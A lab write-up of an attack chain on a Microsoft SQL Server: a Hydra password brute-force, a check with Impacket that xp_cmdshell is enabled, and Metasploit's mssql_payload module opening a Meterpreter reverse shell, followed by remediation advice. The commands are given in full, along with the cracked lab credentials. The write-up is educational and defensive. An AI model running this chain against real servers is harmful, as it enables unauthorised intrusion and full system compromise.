# MSSQL Credential Brute-Force → xp_cmdshell RCE → Meterpreter Shell

## Summary
In this lab, I performed a credential brute-force attack against a Microsoft SQL Server instance, verified access manually, confirmed that the `xp_cmdshell` stored procedure could be enabled, and used Metasploit to achieve remote code execution and obtain a Meterpreter session on the target Windows host.

**Target:** `10.10.1.30` (MSSQL / SQL Server 2022 RTM, Windows 10.0.17763)
**Attacker host:** Parrot OS (`attacker@parrot`)
**Tools used:** Hydra, Impacket (`mssqlclient.py`), Metasploit Framework

---

## 1. Credential Brute-Force with Hydra

I used Hydra to brute-force MSSQL login credentials against the target on port `1433`, using a user list and the `rockyou.txt` wordlist.

```
hydra -L /home/attacker/user.txt -P /root/Adtools/rockyou.txt 10.10.1.30 mssql
```

Hydra found one valid set of credentials:

```
[1433][mssql] host: 10.10.1.30   login: SQL_srv   password: batman
```

![Hydra brute-force result](./images/hydra.png)

---

## 2. Manual Verification with Impacket

With valid credentials in hand, I connected manually using Impacket's `mssqlclient.py` to confirm access and inspect the server configuration.

```
python3 /root/impacket/examples/mssqlclient.py SQL_srv:batman@10.10.1.30 -port 1433
```

The connection succeeded, identifying the backend as **Microsoft SQL Server 2022 RTM (16.0.1000)**. I then checked whether `xp_cmdshell` — the stored procedure that allows command execution from SQL — was enabled:

```sql
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured
FROM sys.configurations WHERE name = 'xp_cmdshell';
```

Result:

```
name           IsConfigured
-------------- ------------
xp_cmdshell    1
```

This confirmed `xp_cmdshell` was configured and available for use.

![xp_cmdshell configuration check](./images/xp_cmdshell.png)

---

## 3. Exploitation with Metasploit

I switched to Metasploit and used the `windows/mssql/mssql_payload` module, which can leverage `xp_cmdshell` to stage and execute a payload.

```
use exploit/windows/mssql/mssql_payload
set RHOST 10.10.1.30
set USERNAME SQL_srv
set PASSWORD batman
set DATABASE master
exploit
```

![Metasploit module setup](./images/msf%20setup.png)

The first attempt failed because `xp_cmdshell` was reported as disabled at the session level:

```
[-] 10.10.1.30:1433 - The xp_cmdshell procedure is not available and could not be enabled
[-] Exploit failed: Rex::RuntimeError Failed to execute command.
```

Re-running `exploit` succeeded on the second attempt, staging the payload successfully:

```
[*] Sending stage (177734 bytes) to 192.168.172.130
[*] Meterpreter session 1 opened (192.168.172.143:4444 -> 192.168.172.130:50526)
```

![msfconsole session](./images/msfconsole.png)

---

## 4. Post-Exploitation

With a Meterpreter session established, I dropped into a native shell to confirm the compromised host:

```
(Meterpreter 1)(C:\Windows\system32) > shell
Process 4528 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Remote shell on target](./images/shell.png)

This confirmed full command execution on the target Windows 10 host via the MSSQL service.

---

## Key Takeaways

- **Weak/default credentials** (`SQL_srv:batman`) were brute-forceable with a common wordlist, which was the initial foothold.
- **`xp_cmdshell` enabled** on the SQL Server turned database access directly into OS-level command execution.
- Metasploit's `mssql_payload` module automated staging a Meterpreter payload once valid DB credentials and `xp_cmdshell` access were confirmed.

## Remediation

- Enforce strong, unique passwords for all SQL Server logins; disable or heavily restrict brute-forceable accounts.
- Disable `xp_cmdshell` unless explicitly required, and restrict it via permissions when it must be enabled.
- Apply least-privilege to the SQL service account so that even command execution via `xp_cmdshell` has limited system impact.
- Segment database servers from direct exposure and monitor for repeated failed authentication attempts (which Hydra's brute-force would trigger).

---

*This was performed in an isolated lab environment against private IP ranges (`10.10.x.x` / `192.168.x.x`) for educational purposes only.*
